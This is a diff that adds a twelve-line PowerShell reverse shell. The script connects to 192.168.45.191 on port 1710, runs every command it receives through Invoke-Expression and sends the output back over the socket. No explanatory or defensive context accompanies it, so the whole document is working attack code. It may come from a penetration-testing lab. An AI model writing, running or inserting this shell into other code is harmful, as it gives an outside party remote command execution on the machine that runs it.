@@ -1,0 +1,12 @@
+$client = New-Object System.Net.Sockets.TCPClient("192.168.45.191", 1710)
+$stream = $client.GetStream()
+$writer = New-Object System.IO.StreamWriter($stream)
+$buffer = New-Object System.Byte[] 1024
+while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
+    $data = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
+    $output = iex $data 2>&1 | Out-String
+    $outputBytes = [System.Text.Encoding]::ASCII.GetBytes($output + "`n")
+    $stream.Write($outputBytes, 0, $outputBytes.Length)
+    $stream.Flush()
+}
+$client.Close()
